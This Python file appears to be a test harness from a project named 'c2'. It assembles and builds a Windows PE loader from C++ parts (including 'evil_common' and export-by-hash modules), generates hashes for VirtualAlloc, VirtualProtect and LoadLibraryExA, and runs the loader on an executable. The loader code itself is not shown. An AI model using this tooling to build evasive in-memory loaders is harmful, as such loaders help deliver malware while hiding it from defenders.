import shutil, os

from c2.sprayer.test.spraytest_project import SpraytestProject
from c2.infra.unischema import unischema_load
from c2.stub_tools.make_part_info_defs import MakePartInfoDefsCLI
from c2.stub_tools.strhash import strhash_main
from c2.common.update_hardlinks import update_hardlinks
from c2.common.execcmd import execcmd


_sd = os.path.dirname(__file__)

class LdrProject:
  def __init__(self, prj_dir):
    self.prj_dir = prj_dir
    self._st = SpraytestProject(prj_dir, 'ldrtest')


  def construct_project(self):
    prj_dir = self.prj_dir

    st = self._st
    st.put(allow_exist=True)
    st.write_spraypreparebat_file(True, True)
    src_dir = st.get_src_dir()
    shutil.rmtree(src_dir)
    os.mkdir(src_dir)
    cpp_parts_dir = f'{_sd}/../cpp_parts'
    update_hardlinks(src_dir, cpp_parts_dir, ['ldr.h', 'ldr.cpp', 'evil_common.h', 'evil_common.cpp',
                                               'lpfns.h', 'lpfns.cpp', 'exp_by_hash.h', 'exp_by_hash.cpp',
                                               'dbg.h'])
    update_hardlinks(src_dir, f'{_sd}/ldrtest_files')

    # they want this include files to exist; we need only ldr.json
    MakePartInfoDefsCLI(['-p', 'ldr', '-o', f'{prj_dir}/src/PART_INFO_DEFS.h']).execute()
    open(f'{prj_dir}/src/PART_DEFS.h', 'w').write('#pragma once\n\n// keep me\n\n')
    open(f'{prj_dir}/src/check_payload_info.h', 'w').write('#pragma once\n\n// keep me\n\n')

    strhash_main(['-m', '31', '-o', f'{prj_dir}/string_hashes.h', '-s', 'VirtualAlloc', '-s', 'VirtualFree', '-s',
                  'VirtualProtect', '-s', 'LoadLibraryExA'])


  def build_loader(self, bitness:int):
    st = self._st
    st.cmake_regen(bitness)
    st.cmake_build(bitness)


  # filetype -> 'exe'|'dll'

  def get_loader_exe_path(self, bitness:int, filetype:str, ldrtest_configuration='Debug'):
    assert(bitness == 32 or bitness == 64)
    assert(filetype == 'exe' or filetype == 'dll')
    st = self._st
    _bb = {32: '86', 64: '64'}[bitness]
    return f'{st.prj_dir}/build{_bb}/{ldrtest_configuration}/ldrtest.exe'

  def use_loader(self, bitness:int, filetype:str, mz_file_path, expect_ret:int, ldrtest_configuration='Debug'):
    ldrexe = self.get_loader_exe_path(bitness, filetype, ldrtest_configuration)
    ltargv = [filetype, mz_file_path]
    cmdline = ldrexe + ' ' + ' '.join(ltargv)
    execcmd(cmdline, expect_ret=expect_ret)

